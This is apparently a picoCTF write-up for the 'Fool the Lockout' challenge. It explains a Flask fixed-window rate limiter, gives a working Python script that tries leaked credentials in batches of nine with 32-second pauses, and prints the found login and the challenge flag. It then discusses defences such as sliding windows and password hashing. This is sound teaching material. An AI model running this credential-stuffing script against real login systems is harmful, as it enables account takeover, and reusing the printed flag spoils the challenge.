
# Fool the Lockout — picoCTF 2026

## Challenge Information

| Field             | Details                            |
| ----------------- | ---------------------------------- |
| **Platform**      | picoCTF                            |
| **Category**      | Web Exploitation                   |
| **Challenge**     | Fool the Lockout                   |
| **Difficulty**    | Medium                             |
| **Vulnerability** | Weak fixed-window rate limiting    |
| **Target**        | `http://<challenge-host>:<port>`   |
| **Credentials**   | 100 username/password combinations |

---

## 1. Objective

The challenge provides a Flask web application with a login portal and a list of username/password combinations.
The application attempts to protect the login endpoint using an IP-based rate limiter.
The objective is to:

1. Analyze the Flask source code.
2. Understand how the rate limiter works.
3. Identify a weakness in the implementation.
4. Automate credential testing without triggering the lockout.
5. Obtain valid credentials.
6. Authenticate to the application.
7. Retrieve the flag.

---

# 2. Initial Reconnaissance

The application provides a login page containing:

```text
Username: [................]

Password: [................]

          [ Login ]
```

When invalid credentials are submitted, the application responds with:

```text
Invalid username or password.
```

The challenge also provides a credential dump containing:

```text
100 username/password combinations
```

A straightforward solution would be to test the credentials one by one.
However, the application contains a rate limiter designed to prevent this type of attack.
Therefore, instead of immediately brute-forcing the login page, the first step was to analyze the provided source code.

---

# 3. Source Code Analysis

The application defines three important rate-limit values:

```python
MAX_REQUESTS = 10
EPOCH_DURATION = 30
LOCKOUT_DURATION = 120
```

These represent:

| Variable           |         Value | Purpose                                                  |
| ------------------ | ------------: | -------------------------------------------------------- |
| `MAX_REQUESTS`     |          `10` | Maximum number of requests allowed in the current window |
| `EPOCH_DURATION`   |  `30` seconds | Duration of the request-counting window                  |
| `LOCKOUT_DURATION` | `120` seconds | Duration of the IP lockout                               |

The application stores rate-limit information in:

```python
request_rates = {}
```

The structure for each IP address is:

```python
{
    "num_requests": 0,
    "epoch_start": -1,
    "lockout_until": -1
}
```

The application therefore keeps track of:

* How many requests the IP has made.
* When its current rate-limit window started.
* Whether the IP is currently locked out.

---

# 4. How the Rate Limiter Works

The login function calls:

```python
if exceeded_rate_limit():
    return RATE_LIMITED_HTML
```

before processing the login request.
Inside `exceeded_rate_limit()`, the server identifies the client using:

```python
client_ip = request.remote_addr
```

Therefore, the rate-limit state is associated with the client's IP address.
For POST requests, the counter is incremented:

```python
if request.method == "POST":
    request_rates[client_ip]['num_requests'] += 1
```

If this is the first request in the current window, the application records the start time:

```python
if request_rates[client_ip]['epoch_start'] == -1:
    request_rates[client_ip]['epoch_start'] = curr_time
```

Finally, the application checks:

```python
if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
```

Since:

```python
MAX_REQUESTS = 10
```

the 11th request within the same window triggers the lockout.
The basic behavior is therefore:

```text
Request 1   → Allowed
Request 2   → Allowed
Request 3   → Allowed
...
Request 10  → Allowed
Request 11  → Lockout
```

---

# 5. The Important Part — Rate-Limit Reset

The most important piece of code is inside:

```python
refresh_request_rates_db()
```

The application checks:

```python
if curr_time - epoch_start_time > EPOCH_DURATION:
```

Since:

```python
EPOCH_DURATION = 30
```

the condition becomes:

```python
if current_time - epoch_start_time > 30:
```

When the condition is true:

```python
request_rates[client_ip]["num_requests"] = 0
request_rates[client_ip]["epoch_start"] = -1
```

The request counter is completely reset.

---

# 6. Identifying the Vulnerability

This creates a **fixed-window rate-limiting weakness**.
The application effectively behaves like:

```text
                  30-second window
        ┌───────────────────────────────┐
        │                               │
        │  Request 1                    │
        │  Request 2                    │
        │  Request 3                    │
        │       ...                     │
        │  Request 10                   │
        │                               │
        └───────────────────────────────┘
                       │
                 Window expires
                       │
                       ▼
                  Counter = 0
```

After the 30-second window expires, the attacker receives a fresh set of requests.
Therefore, instead of sending 11 requests continuously, we can send fewer than 10 requests and wait for the window to expire.
For example:

```text
9 attempts
    ↓
wait > 30 seconds
    ↓
counter resets
    ↓
9 attempts
    ↓
wait > 30 seconds
    ↓
counter resets
    ↓
continue
```

---

# 7. Why We Used 9 Requests

We chose:

```python
BATCH_SIZE = 9
```

rather than 10.
The server locks the client when:

```python
num_requests > MAX_REQUESTS
```

and:

```python
MAX_REQUESTS = 10
```

Therefore:

```text
Requests 1–10 → allowed
Request 11     → lockout
```

Using 9 requests gives us a safety margin.
We then wait:

```python
WAIT_TIME = 32
```

The server resets after:

```python
EPOCH_DURATION = 30
```

seconds.
Waiting 32 seconds ensures the window has expired before continuing.

---

# 8. Attack Strategy

Our attack strategy became:

```text
              Credential list
                    │
                    ▼
             Test 9 credentials
                    │
                    ▼
               Wait 32 sec
                    │
                    ▼
             Counter resets
                    │
                    ▼
             Test 9 credentials
                    │
                    ▼
               Wait 32 sec
                    │
                    ▼
             Counter resets
                    │
                    ▼
                  Repeat
                    │
                    ▼
          Valid credentials found
```

This is not technically disabling or bypassing the rate limiter.
Instead, we are **working within its rules**.

---

# 9. Exploitation Script

We created `solve.py` to automate the process.

```python
import requests
import time
import re

TARGET = "http://candy-mountain.picoctf.net:YOUR_PORT"

BATCH_SIZE = 9
WAIT_TIME = 32

with open("creds-dump.txt") as f:
    credentials = [
        line.strip().split(";", 1)
        for line in f
        if line.strip()
    ]

print(f"[*] Loaded {len(credentials)} credentials")

session = requests.Session()

for i, (username, password) in enumerate(credentials):

    if i > 0 and i % BATCH_SIZE == 0:
        print(f"\n[*] Waiting {WAIT_TIME}s for rate-limit reset...")
        time.sleep(WAIT_TIME)

    print(f"[*] Attempt {i + 1}: {username}:{password}")

    response = session.post(
        f"{TARGET}/login",
        data={
            "username": username,
            "password": password
        },
        allow_redirects=False
    )

    # Successful authentication redirects to /
    if response.status_code in (301, 302):

        print("\n[+] LOGIN SUCCESS!")
        print(f"[+] Username: {username}")
        print(f"[+] Password: {password}")

        home = session.get(f"{TARGET}/")

        flag = re.search(
            r"picoCTF\{[^}]+\}",
            home.text
        )

        if flag:
            print(f"\n[+] FLAG: {flag.group(0)}")
        else:
            print("[!] Logged in, but flag wasn't found.")

        break

    if "Rate Limited" in response.text:
        print("[!] Rate limited!")
        break
```

---

# 10. Script Explanation

## Loading Credentials

The credential file is read using:

```python
with open("creds-dump.txt") as f:
```

Each line is split into:

```text
username
password
```

using:

```python
line.strip().split(";", 1)
```

The `1` ensures that the split happens only once.

---

## Creating a Session

We use:

```python
session = requests.Session()
```

instead of using `requests.post()` independently for every request.
This is important because the Flask application creates a session after successful authentication.
The session allows our script to maintain cookies between requests.

---

## Sending the Login Request

The login request is:

```python
response = session.post(
    f"{TARGET}/login",
    data={
        "username": username,
        "password": password
    },
    allow_redirects=False
)
```

The credentials are sent as form data.
We disable automatic redirect following:

```python
allow_redirects=False
```

because successful authentication causes the application to return a redirect.

---

# 11. Detecting Successful Authentication

The application contains:

```python
session["user"] = user_input
```

when authentication succeeds.
It then performs:

```python
return redirect(url_for("index"))
```

Therefore, a successful login produces an HTTP redirect.
Our script checks:

```python
if response.status_code in (301, 302):
```

This gives us a simple way to detect successful authentication.

---

# 12. Retrieving the Flag

After successful authentication, the script requests:

```python
home = session.get(f"{TARGET}/")
```

The `/` route checks:

```python
if not logged_in():
    return redirect(url_for("login"))
```

Because our session contains:

```python
session["user"]
```

we are authenticated.
The application then reads:

```python
flag = open("/challenge/flag.txt").read().strip()
```

and passes it to the template.
Our script searches the response using:

```python
re.search(
    r"picoCTF\{[^}]+\}",
    home.text
)
```

This extracts the flag from the page.

---

# 13. Running the Exploit

The credential file contained:

```text
100 credentials
```

We executed:

```bash
python3 solve.py
```

The script began testing credentials:

```text
[*] Loaded 100 credentials

[*] Attempt 1: rora:winner1
[*] Attempt 2: birendra:rumble
[*] Attempt 3: khalid:sting
[*] Attempt 4: stanislaw:ming
[*] Attempt 5: maged:nimrod
[*] Attempt 6: sigrid:telephon
[*] Attempt 7: alysse:sutton
[*] Attempt 8: emely:tyrant
[*] Attempt 9: cornel:rodman
```

The script then waited:

```text
[*] Waiting 32s for rate-limit reset...
```

After the window expired, it continued:

```text
[*] Attempt 10: shamira:marion
[*] Attempt 11: cymbre:california
[*] Attempt 12: romola:steven
...
[*] Attempt 18: rebbecca:core
```

The process repeated.

---

# 14. Successful Credentials

Eventually, the script reached:

```text
[*] Attempt 19: meridel:bolton
[*] Attempt 20: riva:trent
[*] Attempt 21: dorris:sponge
[*] Attempt 22: ngai:ellie
[*] Attempt 23: gwynn:grizzly
[*] Attempt 24: olenka:london1
[*] Attempt 25: vahe:devilman
[*] Attempt 26: germ:bigguns
```

The application accepted:

```text
Username: germ
Password: bigguns
```

The script reported:

```text
[+] LOGIN SUCCESS!
[+] Username: germ
[+] Password: bigguns
```

---

# 15. Flag

The authenticated request to `/` returned:

```text
picoCTF{f00l_7h4t_l1m1t3r_e5c7c994}
```

---

# 16. Important Observation: Script Attempts vs Server Attempts

One subtle but important concept is that our script's attempt number is **not the same as the server's rate-limit counter**.
For example, our script displayed:

```text
Attempt 10
```

But because we had waited 32 seconds before sending it, the server had already reset:

```text
num_requests = 0
```

Therefore, the server saw:

```text
Script attempt:       10
Server request count:  1
```

Later:

```text
Script attempt:       18
Server request count:  9
```

This distinction is critical for understanding the exploit.
Our script tracks:

```text
Total credentials tested
```

while the server tracks:

```text
Requests inside the current rate-limit window
```

---

# 17. Why the Lockout Failed

The application was designed around this assumption:

```text
"An attacker cannot make enough requests before the lockout."
```

But the attacker can simply slow down.
The actual attack becomes:

```text
9 requests
    ↓
32 second wait
    ↓
9 requests
    ↓
32 second wait
    ↓
9 requests
    ↓
...
```

The attacker remains below the threshold at all times.
Therefore, the lockout mechanism is never triggered.

---

# 18. Developer Perspective

This challenge demonstrates that a security mechanism can exist but still be ineffective.
The application has:

```text
✓ Request counting
✓ IP tracking
✓ Request threshold
✓ Lockout mechanism
✓ Time-based expiration
```

However, the attacker can predict the exact reset behavior.
The important question for a developer should therefore be:

> **"Can an attacker adapt their behavior to work around the way my security control is implemented?"**

In this case, the answer is yes.

---

# 19. Fixed-Window Rate Limiting

The challenge uses a simple fixed-window model.
Conceptually:

```text
Window 1
────────────────────────
00s                    30s
│                       │
├─ request              │
├─ request              │
├─ request              │
└─ request              │
                        │
                     RESET
                        │
Window 2                │
────────────────────────
30s                    60s
```

The major weakness is the complete reset.
An attacker can intentionally wait for the boundary.

---

# 20. Sliding-Window Rate Limiting

A stronger approach is a **sliding window**.
Instead of resetting everything at a fixed point, the application asks:

> How many requests occurred during the last 30 seconds from this moment?

For example:

```text
Current time = 12:00:30

Last 30 seconds:
12:00:03  request
12:00:08  request
12:00:12  request
12:00:19  request
12:00:25  request
```

At 12:00:31, the window moves:

```text
12:00:04 → 12:00:31
```

The old request at 12:00:03 is removed, but the newer requests remain.
There is therefore no single reset point where the attacker suddenly receives a fresh allowance.

---

# 21. Token Bucket

Another common approach is a **token bucket**.
Imagine the application gives each client a bucket:

```text
Capacity = 10 tokens
```

Each request consumes a token:

```text
10 tokens
    ↓
request
    ↓
9 tokens
```

Tokens slowly regenerate.
This allows normal users to make occasional requests while limiting sustained automated requests.
Token bucket algorithms are commonly useful for APIs and high-volume services.

---

# 22. Progressive Login Delays

Another defense is progressive delay.
For example:

```text
Failed attempt 1 → normal response
Failed attempt 2 → small delay
Failed attempt 3 → larger delay
Failed attempt 4 → larger delay
...
```

The purpose is to increase the cost of automated guessing without permanently locking out legitimate users.

---

# 23. Why IP-Only Rate Limiting Is Not Enough

The application uses:

```python
client_ip = request.remote_addr
```

This means the protection is based on the source IP.
But an IP does not necessarily represent one user.
For example:

```text
University / Company Network
          │
        NAT
          │
    Public IP
          │
     ┌────┼────┐
     │    │    │
   User User User
```

Multiple legitimate users can share the same public IP.
At the same time, an attacker may potentially distribute requests across different IP addresses.
Therefore, a robust authentication system should combine multiple signals and controls rather than depending exclusively on an IP address.

---

# 24. Redis for Distributed Rate Limiting

The current application stores rate-limit state in:

```python
request_rates = {}
```

This is an in-memory Python dictionary.
That becomes problematic when an application is deployed across multiple servers.
Imagine:

```text
                  Load Balancer
                /       |       \
               /        |        \
          Server 1   Server 2   Server 3
```

Each server could have its own:

```python
request_rates = {}
```

Therefore:

```text
Server 1 → 5 requests
Server 2 → 5 requests
Server 3 → 5 requests
```

could appear as only 5 requests to each individual server.

---

## Using Redis

[Redis](https://redis.io/?utm_source=chatgpt.com) can provide shared rate-limit state:

```text
                  Load Balancer
                /       |       \
               /        |        \
          Server 1   Server 2   Server 3
               \        |        /
                \       |       /
                    Redis
                      │
              Shared counters
```

Now all servers use the same state:

```text
Server 1 ──┐
Server 2 ──┼──→ Redis → shared request count
Server 3 ──┘
```

Redis is especially useful because keys can have expiration times, which is convenient for temporary rate-limit state.
However, **Redis alone does not solve the vulnerability**.
It solves the shared-state problem.
The actual rate-limit algorithm still needs to be designed correctly.

---

# 25. Password Storage

Another issue visible in the challenge source is that the application stores passwords directly:

```python
user_db[username] = password
```

A real application should never store plaintext passwords.
Instead, passwords should be stored using password-hashing algorithms such as:

* Argon2id
* bcrypt
* scrypt

The authentication process should be:

```text
User password
      ↓
Password hashing / verification
      ↓
Stored password hash
      ↓
Match?
   /     \
 Yes      No
  │        │
Login     Reject
```

rather than directly comparing plaintext passwords.
This is separate from the rate-limiting vulnerability, but it is an important security observation from the source code.

---

# 26. Username Enumeration

The application returns:

```text
Invalid username or password.
```

for both:

* nonexistent users
* incorrect passwords

This is preferable to responses such as:

```text
Username does not exist.
```

or:

```text
Incorrect password.
```

Different messages could allow an attacker to enumerate valid usernames before attacking their passwords.
Using a generic authentication failure message reduces this information leak.

---

# 27. How a More Robust Login System Could Look

A production authentication system could combine:

```text
                    Login
                      │
                      ▼
              Input validation
                      │
                      ▼
               IP rate limit
                      │
                      ▼
             Account throttling
                      │
                      ▼
              Password hashing
                      │
                 ┌────┴────┐
                 │         │
               FAIL      SUCCESS
                 │         │
                 ▼         ▼
          Progressive     Session
             delay          │
                 │          ▼
                 │       Dashboard
                 │
                 ▼
           Security logging
```

Additional verification such as CAPTCHA or MFA can also be introduced when suspicious activity is detected.

---

# 28. Root Cause

The primary root cause is the predictable reset behavior of the fixed-window rate limiter:

```python
if curr_time - epoch_start_time > EPOCH_DURATION:
    request_rates[client_ip]["num_requests"] = 0
```

This gives an attacker a predictable cycle:

```text
send requests
      ↓
wait
      ↓
counter reset
      ↓
send requests again
```

The security control therefore limits **request speed**, but does not effectively prevent a persistent automated credential attack.

---

# 29. Exploitation Summary

The entire attack can be summarized as:

```text
1. Inspect Flask source
          ↓
2. Identify MAX_REQUESTS = 10
          ↓
3. Identify EPOCH_DURATION = 30
          ↓
4. Identify counter reset
          ↓
5. Send 9 credentials
          ↓
6. Wait 32 seconds
          ↓
7. Counter resets
          ↓
8. Send another 9 credentials
          ↓
9. Repeat
          ↓
10. Valid credentials found
          ↓
11. Flask session established
          ↓
12. Request /
          ↓
13. Flag retrieved
```

---

# 30. Lessons Learned

## Web Security

* Authentication endpoints need strong brute-force protection.
* Rate limiting must be designed around realistic attacker behavior.
* Fixed-window rate limiting has important edge cases.
* IP-based protection alone is insufficient.
* Distributed applications require shared rate-limit state.
* Login error messages should avoid unnecessary information disclosure.
* Passwords must be securely hashed.

## Python / Flask

* Flask sessions can maintain authentication state through cookies.
* `request.remote_addr` provides the client's apparent IP address.
* `redirect()` produces an HTTP redirect.
* Application source code can reveal security assumptions and implementation weaknesses.

## Automation

* Python `requests` can automate HTTP interactions.
* `requests.Session()` maintains cookies between requests.
* HTTP status codes can be used to identify authentication behavior.
* Regular expressions can extract flags from HTTP responses.

## CTF Methodology

The biggest lesson was:

```text
Don't blindly attack the login page.

Read the source.
Understand the security control.
Find the assumption behind it.
Then design the exploit around that assumption.
```

---

# 31. Conclusion

The challenge was solved by identifying a weakness in the application's fixed-window IP-based rate limiter.
The application allows up to 10 requests before triggering the lockout, but the request counter is completely reset after 30 seconds.
By sending only 9 login attempts at a time and waiting 32 seconds between batches, we were able to continuously test the supplied credentials without triggering the lockout.
The valid credentials were:

```text
Username: germ
Password: bigguns
```

The resulting authenticated session allowed access to the application's homepage, where the flag was retrieved.
**Flag:**

```text
picoCTF{f00l_7h4t_l1m1t3r_e5c7c994}
```

---

## 32. Key Takeaway

> **A rate limiter should not merely limit requests; it should make automated attacks impractical.**

The challenge demonstrates why developers need to analyze how security mechanisms behave over time and under adaptive attacker behavior.

---
